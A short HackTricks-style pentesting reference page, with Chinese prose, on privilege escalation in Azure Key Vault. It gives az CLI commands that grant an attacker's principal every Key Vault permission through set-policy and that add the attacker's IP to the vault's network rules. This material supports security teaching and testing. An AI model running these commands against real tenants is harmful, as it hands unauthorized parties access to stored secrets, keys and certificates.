# Az - Key Vault Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Key Vault

有关此服务的更多信息，请查看：

{{#ref}}
../az-services/az-keyvault.md
{{#endref}}

### `Microsoft.KeyVault/vaults/write`

拥有此权限的攻击者将能够修改密钥保管库的策略（密钥保管库必须使用访问策略而不是 RBAC）。
```bash
# If access policies in the output, then you can abuse it
az keyvault show --name <vault-name>

# Get current principal ID
az ad signed-in-user show --query id --output tsv

# Assign all permissions
az keyvault set-policy \
--name <vault-name> \
--object-id <your-object-id> \
--key-permissions all \
--secret-permissions all \
--certificate-permissions all \
--storage-permissions all
```
### 修改网络限制

可能你拥有足够的权限访问敏感数据（例如，秘密的值），但由于密钥保管库限制在特定网络内，你无法访问。如果你有权限修改网络限制，你可以将你的IP添加到允许的IP列表中。
```bash
# Get the current network restrictions
az keyvault network-rule list --name <vault-name>

# Add your IP to the list
az keyvault network-rule add --name <vault-name> --ip-address <your-ip>
```
{{#include ../../../banners/hacktricks-training.md}}
